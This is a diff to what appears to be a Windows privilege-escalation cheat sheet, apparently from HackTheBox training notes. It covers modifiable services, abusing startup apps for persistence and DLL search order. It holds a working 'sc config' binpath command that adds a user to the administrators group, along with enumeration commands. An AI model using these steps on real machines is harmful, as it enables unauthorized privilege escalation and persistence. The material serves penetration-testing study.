@@ -285,12 +285,16 @@ check === Modifiable Services ===
 accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
 sc config ServiceName binpath="cmd /c net localgroup administrators htb-student /add"
 ```
-### Abusing Start Up Apps
+### Abusing Start Up Apps (Persistence)
 ```
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl (Startup commands registered in Windows (Registry + Startup folders) through WMI/CIM)
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp (Files (typically shortcuts) in the All Users Startup folder)
 #Check writable permissions and transfer
-#The only catch here is the system needs to be restarted
+#The only catch here is the system needs to be restarted or the user need to login again
+```
+>Note that all the sites where you can find autoruns are already searched by winpeas.exe. However, for a more comprehensive list of auto-executed file you could use autoruns from systinternals:
+```
+autorunsc.exe -m -nobanner -a * -ct /accepteula
 ```
 ### Service DLL Hijacking
 >The following is the default search order with SafeDllSearchMode enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode registry value and set it to 0 (default is enabled).
